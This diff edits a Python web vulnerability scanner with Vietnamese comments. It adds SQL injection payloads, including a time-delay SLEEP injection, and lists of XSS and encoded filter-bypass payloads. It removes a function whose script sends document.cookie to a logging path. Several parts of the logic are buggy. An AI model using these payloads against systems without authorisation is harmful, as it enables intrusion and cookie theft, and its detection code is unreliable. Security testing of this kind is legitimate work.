@@ -46,47 +46,83 @@ def crawl(url):
     return urls
 
 # Hàm kiểm tra SQL injection
-def check_sqli(url, resp1):
-  test_urls = [f"{url}' OR '1'='1", f"{url}' AND '1'='2"]
-  
+def check_sqli(url, response):
+  orig_resp = requests.get(url)
+  orig_status = orig_resp.status_code
+  orig_headers = orig_resp.headers
+  orig_content = orig_resp.text
+  orig_time = orig_resp.elapsed.total_seconds()
+
+  test_urls = [
+    f"{url}' OR '1'='1", 
+    f"{url}' AND '1'='2",
+    f"{url}'; SELECT SLEEP(5); -- "
+  ]
+
   for test_url in test_urls:
-    resp1 = requests.get(test_url)  
-    if check_error(resp1):
-      print("Error based SQLi detected")
-      return True
+    print(url)
+    payload_resp = requests.get(test_url)
 
-# Kiểm tra blind SQLi
-  original_url = f"{url}&id=1" 
-  resp2 = requests.get(original_url)
+    if payload_resp.status_code != orig_status:
+      print("Different status code")
+      
+    if payload_resp.headers != orig_headers:
+      print("Different headers")
+      
+    if payload_resp.text != orig_content:
+      print("Different response content")
 
-  test_urls = [f"{url}' OR '1'='1", f"{url}' AND '1'='2"]
-  resp3 = requests.get(test_url)
+    payload_time = payload_resp.elapsed.total_seconds()
+    if payload_time - orig_time > 4:
+      print("Time delay detected")
 
-  columns1 = len(resp2.text.split("</td>"))
-  columns2 = len(resp3.text.split("</td>"))
+    if "SQL syntax" in payload_resp.text:
+      print("Error message detected")
 
-  if columns1 != columns2:
-     print("Blind SQLi detected")
-     return True
-  
-  return False
-
-def check_error(response):
-  # Kiểm tra nội dung lỗi 
-  if "SQL syntax" in response.text:
-    return True
-  # Kiểm tra time delay
-  if response.elapsed.total_seconds() > 1:  
-    return True
-    
-  return False
+  print("SQL injection scan completed")
 
 # -----------------------------------------------------------------------
 # Hàm kiểm tra XSS
 session = requests.Session()
-payloads = ["<script>alert(1)</script>", "';alert(1)//", "<img src=1 onerror=alert(1)>"] 
+encoded_payloads = ["%3Cscript%3Ealert(1)%3C/script%3E", "%27%3Balert(1)//", "%3Cimg+src%3D1+onerror%3Dalert(1)%3E"]
+attr_payloads = ['" onclick="alert(1)', '" style="xss:expression(alert(1))'] 
+tag_payloads = ['<script>alert(1)</script>', '<img src=1 onerror=alert(1)>']
+url_payloads = ['javascript:alert(1)', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+                "?param=<script>alert(1)</script>",
+                "?param=javascript:alert(1)"]
+
+html_payloads = [
+  "<img src=x onerror=alert(1)>",  
+  "<div id='<' onclick='alert(1)'>" 
+]
+
+def detect_context(url, response):
+  # Phân tích URL và response để xác định context
+  response = requests.get(url)
+
+  # context = detect_context(url, response.text) 
+  
+  if url.find("?") > 0:
+    return "url_param" 
+  elif response.text.find("<script>") > 0:
+    return "html_tag"
+  elif response.text.find("onclick=") > 0:
+    return "attribute"
+
+  return None
 
 def check_xss(url, response):
+
+  payloads = []
+
+  context = detect_context(url, response)
+  
+  if context == "url_param":
+    payloads = url_payloads
+  elif context == "html_tag":
+    payloads = html_payloads
+  elif context == "attribute":
+    payloads = attr_payloads
 
   soup = BeautifulSoup(response.content, 'html.parser')
 
@@ -99,7 +135,7 @@ def check_xss(url, response):
         data[input.get('name')] = payload
         response = session.post(url + form['action'], data=data)
         if payload in response.text:
-          print('XSS in', url + form['action'])
+          print('\nChecking XSS in:', url + form['action'])
 
   # Check URL parameters
   params = re.findall(r'([^?=&]+)=([^&]*)', url)
@@ -108,23 +144,25 @@ def check_xss(url, response):
       url = url.replace(f'{name}={value}', f'{name}={payload}')
       response = session.get(url)
       if payload in response.text:
-        print('XSS in', url)
+        print('\nChecking XSS in:', url)
+
+  for encoded_payload in encoded_payloads:
+    url = f"{url}?q={encoded_payload}"
+    response = requests.get(url)
+    
+    if encoded_payload in response.text:
+      print("\nTrying bypass filter with encoded payload: ", url)
+
+    normal_payload = "<script>alert(1)</script>"
+    url = f"{url}?q={normal_payload}"
+    response = requests.get(url)
+
+    if normal_payload not in response.text:
+      print("\nChecking site filters special characters from URL: ", url)
+
 
   return False
 
-# ------------------------
-url = sys.argv[2]
-domain = url.rsplit('/', 1)[0]
-
-def check_blind_xss(url):
-  payload = f"<script>fetch('{domain}/log?cookie=' + document.cookie)</script>"
-
-  requests.get(url + payload)
-  
-  if requests.get(f"{domain}/log").text == "XSSCOOKIE":
-    print("Blind XSS detected")
-
-check_blind_xss(url)
 
 
 # -------------------------------------------------
